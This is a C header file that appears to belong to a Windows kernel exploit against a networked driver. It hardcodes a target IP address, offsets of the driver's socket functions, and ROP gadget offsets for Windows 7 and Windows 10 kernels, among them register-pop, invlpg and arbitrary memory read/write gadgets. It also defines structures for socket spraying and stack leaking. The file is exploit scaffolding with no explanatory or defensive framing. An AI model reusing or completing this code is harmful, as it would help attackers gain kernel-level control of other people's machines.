#pragma comment(lib, "ws2_32.lib")

#ifndef  __INCLUDES_H__
#define __INCLUDES_H__

#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <Winsock2.h>

#include <Windows.h>
#include <stdio.h>

#include <vector>

//#include <pe_parse.h>

#define COUNT_SOCKS		10
#define TARGET_HOST     "192.168.195.159" 
#define MODULES_KENREL_INDEX 0

typedef enum _OS_VER_ {
    Win7 = 7601,
    Win8 = 9200,
    Win10 = 10240,
};

extern ULONG glDriverBase;
extern ULONG glKernelBase;
extern ULONG glNetioBase;
extern USHORT glOsVer;

typedef enum _RVA_ {
    rvaToStrQUIT = 0x26B0,
    rva_PR_CloseSocket = 0x157C,
    rva_PR_CloseSocket2 = 0x1580,
    rva_Send = 0x1C00,
    rva_Recv = 0x1F30,
    rva_KernelImpAddr = 0x3014,
    rva_NetioImpAddr = 0x300C,

    // rops
    gad_AddEsp18_PopEdiEsiEbx = 0x2485,
    gad_PopEbp = 0x17A0,
    gad_MovEspEbp = 0x179E,
    gad_ret = 0x17A1,
    gad_retn18 = 0x1A8C,
}RVA;

typedef enum _GAD_RVA_WIN7_ {
    gad_krnl7_popEax = 0x19551,
    gad_krnl7_popEbx = 0x13EA,
    gad_krnl7_popEcx = 0x1BAF,
    gad_krnl7_popEdx = 0x390F2,
    gad_krnl7_popEbp = 0x133B,
    gad_krnl7_popEdi = 0x1298,
    gad_krnl7_popEsi = 0x1E1E,

    gad_krnl7_invlpg = 0x33BF1,
    gad_krnl7_sGadMovMemRegEax = 0x25119,
    gad_krnl7_gadMovRegMemReg = 0x41E88,

}GAD_RVA_WIN7;

typedef enum _GAD_RVA_WIN10_ {
    gad_krnl10_popEax = 0x20FD0,
    gad_krnl10_popEbx = 0x1F6D8,
    gad_krnl10_popEcx = 0x204F2,
    gad_krnl10_popEdx = 0xCC00,
    gad_krnl10_popEbp = 0x1F562,
    gad_krnl10_popEdi = 0x276CE,
    gad_krnl10_popEsi = 0xC0B1,

    gad_krnl10_invlpg = 0x916B8,
    gad_krnl10_sGadMovMemRegEax = 0xB3688,
    gad_krnl10_gadMovRegMemReg = 0x41E88,

}GAD_RVA_WIN10;

typedef struct _SOCKETS_ {
    SOCKET mainSock;
    SOCKET targetSock;
    SOCKET tmpSocks[COUNT_SOCKS];
}SOCKETS, * PSOCKETS;

typedef struct _STACKS_ {
    ULONG mainStack;
    ULONG targetStack;
    ULONG diffStacks;
    BOOL isUp;
} STACKS, *PSTACKS;

typedef struct _MEM_WORK_ {
    SOCKETS socks;
    STACKS stacks;
    ULONG leakSock;
} MEM_WORK, *PMEM_WORK;

#endif
